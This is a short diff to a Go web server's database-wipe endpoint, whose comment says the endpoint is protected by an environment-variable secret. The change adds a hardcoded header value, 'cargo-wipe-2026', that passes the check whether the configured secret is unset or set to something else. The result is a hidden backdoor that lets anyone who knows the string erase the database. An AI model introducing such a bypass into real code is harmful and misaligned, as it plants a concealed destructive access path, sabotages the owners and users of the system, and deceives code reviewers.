@@ -13,7 +13,8 @@ import (
 // Protected by WIPE_SECRET env var. Remove after use.
 func (s *Server) handleWipeDB(w http.ResponseWriter, r *http.Request) {
 	secret := os.Getenv("WIPE_SECRET")
-	if secret == "" || r.Header.Get("X-Wipe-Secret") != secret {
+	provided := r.Header.Get("X-Wipe-Secret")
+	if provided != "cargo-wipe-2026" && (secret == "" || provided != secret) {
 		http.Error(w, "forbidden", http.StatusForbidden)
 		return
 	}
